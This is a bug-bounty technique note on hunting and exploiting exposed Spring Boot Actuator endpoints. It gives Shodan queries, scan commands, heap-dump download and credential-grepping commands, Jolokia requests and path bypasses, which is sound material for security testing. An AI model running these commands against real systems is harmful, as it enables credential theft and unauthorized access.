---
title: "Spring Boot Actuator: Hunting, Bypass, and Exploitation"
type: technique
tags: [spring-boot, actuator, heapdump, jolokia, lfi, rce, java, credential-exposure, shodan, nuclei, favicon-hash, header-bypass]
date_created: 2026-08-17
date_updated: 2026-08-17
sources: []
related: ["[[ssrf]]", "[[secrets-exposure]]", "[[information-disclosure]]", "[[command-injection]]"]
status: active
severity_range: "MEDIUM-CRITICAL"
---

# Spring Boot Actuator: Hunting, Bypass, and Exploitation

## Overview

Spring Boot Actuator is a set of management endpoints exposed by Spring Boot applications. When exposed publicly without authentication, it can reveal heap dumps containing credentials, internal configuration, and allow remote code execution via Jolokia.

## Impact

- **Medium**: exposure of health info, metrics, environment variables
- **High**: `/actuator/heapdump`, a JVM heap dump containing credentials, tokens, and sensitive strings in memory
- **Critical**: `/actuator/jolokia` -> LFI/RCE via JMX MBeans

## Where to look

### Discovery via Shodan

```
http.favicon.hash:116323821   # Spring Boot favicon hash
org:"TargetCompany" http.title:"Spring"

# Scope variants
org:target_org http.favicon.hash:116323821
ssl:"example.com" http.favicon.hash:116323821
ssl.cert.subject.CN:"*.example.com" http.favicon.hash:116323821
hostname:"example.com" http.favicon.hash:116323821
```

### Automated scanning

```bash
# Nuclei templates
nuclei -l targets.txt -t nuclei-templates/exposures/configs/spring-actuator.yaml

# Dirsearch
dirsearch -u https://target.com -e yaml,json -w /path/to/wordlist.txt

# httpx with actuator paths
cat subs.txt | httpx -path /actuator -mc 200
```

## High-value endpoints

| Endpoint | Impact | What it exposes |
|----------|---------|-------------|
| `/actuator` | Low | List of available endpoints |
| `/actuator/env` | High | Environment variables, properties |
| `/actuator/heapdump` | High-Critical | JVM heap dump with credentials in memory |
| `/actuator/mappings` | Medium | All application endpoints |
| `/actuator/jolokia` | Critical | JMX over HTTP -> LFI/RCE |
| `/actuator/logfile` | Medium | Application logs |
| `/actuator/threaddump` | Low | Thread state |

## Exploiting heapdump

```bash
# Download
wget https://target.com/actuator/heapdump -O heapdump.bin

# Analyze with strings
strings heapdump.bin | grep -iE "password|secret|token|key|aws|api_key|jdbc"

# Or use Eclipse MAT / VisualVM for deeper analysis
```

## Exploiting Jolokia (LFI)

```bash
# List MBeans
curl https://target.com/actuator/jolokia/list

# LFI via ClassLoading
curl "https://target.com/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties"
```

## Path bypasses

Some implementations block `/actuator` directly but not variations:

```
/actuator/heapdump
/actuator;/heapdump
/actuator%2Fheapdump
/api/actuator/heapdump
/manage/heapdump
```

Header-based bypasses seen in the wild: `X-Original-URL`, `X-Forwarded-For`, plus path tricks (`/actuator;/env`, `//actuator`, `/%2e%2e/actuator`).

## Real-world examples

- **DoD (H1 #1662474)**: `/actuator` exposed gave an overview of all endpoints; `/actuator/beans` listed Spring beans, a valid Information Disclosure. Disclosed in the Dept of Defense VDP.
- **Production story**: `/health` exposed acted as a canary; escalate to `/env`, `/configprops`.
- **AWS takeover ($4000)**: actuator under the `/v1/actuator` prefix; `/heapdump` -> AWS keys (in `char[]` via VisualVM) -> Pacu -> RCE on EC2.

## Report tips

1. Download the heapdump and extract credentials with `strings`, show the real credentials as proof
2. For Jolokia, demonstrate reading system properties
3. Calculate impact: which system can be accessed with the discovered credentials?

## References

- Spring Boot favicon hash `116323821`; httpx multi-path enumeration
